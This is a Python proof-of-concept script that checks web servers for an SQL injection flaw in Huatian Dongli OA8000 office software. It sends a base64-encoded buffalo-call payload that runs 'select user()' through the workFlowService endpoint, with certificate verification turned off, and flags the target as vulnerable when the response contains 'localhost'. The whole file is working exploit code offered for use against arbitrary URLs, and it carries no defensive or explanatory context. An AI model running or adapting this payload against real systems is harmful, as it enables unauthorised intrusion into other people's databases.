#!/usr/bin/env python
# coding=utf-8
#华天动力OA8000版sql注入
import base64
from termcolor import colored
import requests,threading
requests.packages.urllib3.disable_warnings()  #忽略证书报错
results = ''
def pscan_vuln(url):
    urls = url
    global results
    headers = {
        "Content-Length": "213",
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "Origin": "null",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Connection": "close",
    }
    data = base64.b64decode('PGJ1ZmZhbG8tY2FsbD4gCjxtZXRob2Q+Z2V0RGF0YUxpc3RGb3JUcmVlPC9tZXRob2Q+IAo8c3RyaW5nPnNlbGVjdCB1c2VyKCk8L3N0cmluZz4gCjwvYnVmZmFsby1jYWxsPg==')
    try:
        response = requests.post(url +'/OAapp/bfapp/buffalo/workFlowService', headers=headers,data=data,verify=False,timeout=20)
        if 'localhost' in response.text:
            print(colored('[+]存在华天动力OA8000版sql注入', 'red'))
            results = f'{urls}-->存在华天动力OA8000版sql注入'
        else:
            print('[-]不存在华天动力OA8000版sql注入')
    except:
        print('[-]不存在华天动力OA8000版sql注入')

def htOA(urls):
    threads = []
    t = threading.Thread(target=pscan_vuln, args=(str(urls),))
    threads.append(t)
    t.start()
    for t in threads:
        t.join()
    return results
